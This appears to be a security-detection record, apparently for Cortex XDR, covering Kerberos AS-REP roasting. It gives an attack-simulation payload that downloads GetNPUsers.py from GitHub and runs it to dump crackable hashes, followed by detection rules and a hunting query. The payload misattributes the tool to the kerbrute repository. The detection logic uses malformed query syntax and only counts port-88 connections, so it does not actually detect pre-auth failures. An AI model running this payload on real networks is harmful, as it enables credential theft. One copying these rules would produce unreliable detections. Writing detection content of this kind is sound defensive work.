identity.name: Kerberos Pre-Auth Failures via AS-REP Roasting
identity.summary: An attacker uses a tool like GetNPUsers.py to request AS-REP responses from Kerberos for users without pre-authentication, then cracks the response offline. Cortex detects this through unusual Kerbero
identity.description: An attacker uses a tool like GetNPUsers.py to request AS-REP responses from Kerberos for users without pre-authentication, then cracks the response offline. Cortex detects this through unusual Kerberos pre-auth failure patterns.

payload.code:
wget -O /tmp/GetNPUsers.py https://raw.githubusercontent.com/ropnop/kerbrute/master/GetNPUsers.py

cat > /tmp/attack_script.sh << 'EOF'
#!/bin/bash
python3 /tmp/GetNPUsers.py 192.0.2.100/ -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep_hashes.txt
EOF

chmod +x /tmp/attack_script.sh
/tmp/attack_script.sh

biocs.name: Kerberos AS-REP Failure by Host
biocs.description: Detects multiple failed Kerberos AS-REP requests from a single host
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip = '192.0.2.100' and dst_port = 88 and action_process_image_name = 'python3'
| comp count() as cnt by agent_hostname
| comp count() as cnt by > 5

abiocs.name: Kerberos Pre-Auth Failure Pattern
abiocs.description: Detects unusual Kerberos pre-authentication failures from a single host in a short time window
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip = '192.0.2.100' and dst_port = 88
| comp count() as cnt by agent_hostname
| comp count() as cnt by > 3
| comp 1m

xql_queries.name: Kerberos AS-REP Failure Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK and event_sub_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip = '192.0.2.100' and dst_port = 88
| comp count() as cnt by agent_hostname
| comp count() as cnt by > 5
